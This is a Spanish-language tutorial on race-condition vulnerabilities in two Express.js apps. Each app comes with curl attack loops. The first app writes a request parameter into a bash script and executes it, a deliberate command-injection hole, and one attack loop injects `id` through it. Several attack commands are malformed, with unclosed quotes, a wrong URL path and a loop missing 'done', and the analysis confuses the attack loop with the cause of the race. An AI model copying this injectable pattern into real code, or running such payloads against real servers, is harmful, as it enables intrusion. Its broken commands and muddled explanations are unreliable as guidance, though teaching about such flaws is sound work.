Las condiciones de carrera (race conditions) son una clase de vulnerabilidades comunes en aplicaciones concurrentes donde el comportamiento del software depende del orden de ejecución de eventos. En entornos web, estas vulnerabilidades pueden ser explotadas por atacantes para obtener acceso no autorizado, ejecutar comandos maliciosos o manipular datos de forma inesperada. A continuación, se presentan dos ejemplos de códigos Express.js que exhiben vulnerabilidades de race condition y cómo un atacante podría explotarlas:

### Ejemplo 1: Vulnerabilidad de Condiciones de Carrera en Node.js

#### Código Vulnerable:
```javascript
const express = require("express");
const app = express();
const { exec } = require("child_process");
const { execSync } = require("child_process");
const fs = require("fs");

app.use(express.static(__dirname + "/static"));
app.use(express.urlencoded({ extended: true }));

app.get("/", (req, res) => {
  let hello = "";
  let action = req.query.action ? req.query.action : "run";
  if (action === "validate") {
    let person = req.query.person ? req.query.person : "Default User";
    let valid = boot_validate(person);
    if (valid == "") {
      boot_clean();
    }
  } else if (action == "reset") {
    boot_clean();
    boot_reset();
    boot_run();
  } else {
    boot_run();
    try {
      hello = fs.readFileSync("hello.txt", "utf8").toString();
    } catch (error) {
      hello = "Important hello file is missing, please reset.";
      boot_clean();
      boot_reset();
      boot_run();
    }
  }
  res.render("index.ejs", { action: action, hello: hello });
});

app.use(function (req, res) {
  res.status(404).render("404.ejs");
});

const boot_validate = (person) => {
  fs.writeFileSync("hello.sh", 'echo "' + person + '" > hello.txt');
  exec("echo 'hello.sh updated -- " + Date.now() + "' > log.txt");
  exec("echo 'hello.sh cleaned -- " + Date.now() + "' >> log.txt");
  exec("bash hello.sh");
  const valid = () => {
    return execSync(
      "sed -n '/^echo \"[A-Za-z0-9 ]*\" > hello.txt$/p' hello.sh"
    ).toString();
  };
  return valid();
};

const boot_clean = () => {
  exec(`rm hello.txt`);
};

const boot_run = () => {
  exec(`bash hello.sh`);
};

const boot_reset = () => {
  fs.writeFileSync("hello.sh", "echo 'Default User' > hello.txt");
};

const port = process.env.PORT || 5000;

app.listen(port, "0.0.0.0", () => console.log(`Listening on port ${port}...!!!`));
```

#### Análisis:
- **Causa de la Condiciones de Carrera:** En este caso, la condición de carrera surge debido a la concurrencia no controlada en el manejo de solicitudes HTTP. Específicamente, los dos comandos de ataque están diseñados para enviar múltiples solicitudes simultáneas al servidor, lo que podría causar conflictos en el acceso y manipulación de los recursos compartidos, como archivos o variables de estado.

#### Descripción de los Comandos de Ataque:
1. **Comando de Ataque 1:** 
```bash
while true; do curl -s -X GET 'http://localhost:5000/action=run' | grep "Check this out" | html2text | xargs | grep -vE "hola|Important|Default User; done
```

   Este comando realiza solicitudes HTTP repetidas al endpoint "/action=run". El resultado de cada solicitud se filtra para encontrar líneas que contienen "Check this out", que luego se convierten en texto sin formato con `html2text`. Finalmente, se filtran nuevamente para eliminar líneas que contienen las palabras "hola", "Important", o "Default User". Este bucle infinito puede sobrecargar el servidor y causar comportamientos inesperados como por ejemplo podriamos ver el resultado del siguiente comando que inyecta un comando si no se gestiona adecuadamente la concurrencia en la manipulación de las solicitudes entrantes.

2. **Comando de Ataque 2:**
```bash
while true; do curl -s -X GET 'http://localhost:5000/?person=`id`&action=validate'"
```
   

 Este comando también realiza solicitudes HTTP repetidas, pero en este caso, al endpoint "/?person=`id`&action=validate". Aquí, el atacante aprovecha una vulnerabilidad de inyección de comandos al pasar el resultado de `id` como el parámetro "person". Si el servidor no sanitiza correctamente esta entrada, podría ejecutar comandos maliciosos en lugar de un nombre de usuario válido. Este ataque podría llevar a la ejecución no autorizada de comandos en el servidor.

### Ejemplo 2: Vulnerabilidad de Condiciones de Carrera en Node.js

#### Código Vulnerable:
```javascript
const express = require("express");
const app = express();
const fs = require("fs");

app.use(express.static(__dirname + "/static"));
app.use(express.urlencoded({ extended: true }));

app.get("/", (req, res) => {
  res.render("index.ejs", { mode: null, os_result: null, print_result: null });
});

app.get("/:value", (req, res) => {
  fs.writeFileSync("shared-file.txt", req.params.value);
  fs.open("shared-file.txt", "r", (err, fd) => {
    let file = fs.readFileSync("shared-file.txt", "utf8");
    res.setHeader("Content-Type", "text/html", "charset=utf-8");
    res.setHeader(
      "Content-Disposition",
      "attachment; filename=shared-file.txt"
    );
    res.sendFile(__dirname + "/shared-file.txt");
  });
});

app.use(function (req, res) {
  res.status(404).render("404.ejs");
});

const port = process.env.PORT || 5000;

app.listen(port, "0.0.0.0", () => console.log(`Listening on port ${port}...!!!`));
```

#### Análisis:
- **Causa de la Condiciones de Carrera:** En este caso, la condición de carrera ocurre debido a la manipulación insegura de archivos compartidos por parte del servidor. Cuando múltiples solicitudes intentan escribir en el mismo archivo simultáneamente, puede haber conflictos en la lectura y escritura que conducen a resultados impredecibles.

#### Descripción del Comando de Ataque:
- **Comando de Ataque:**
```bash
while true; do curl -s -X GET 'http://localhost:5000/hola' | grep -v "hola"; done
```  
 Este comando envía solicitudes HTTP repetidas al endpoint "/hola". Cada solicitud es seguida por una tubería (`|`) que pasa la salida a `grep -v "hola"`. Esto significa que la respuesta del servidor que contiene la palabra "hola" será excluida. Al hacerlo repetidamente en un bucle infinito, el atacante puede causar la creación continua de archivos "shared-file.txt" con contenido distinto al esperado, lo que podría interferir con las operaciones normales del sistema y permitir el acceso no autorizado a archivos compartidos.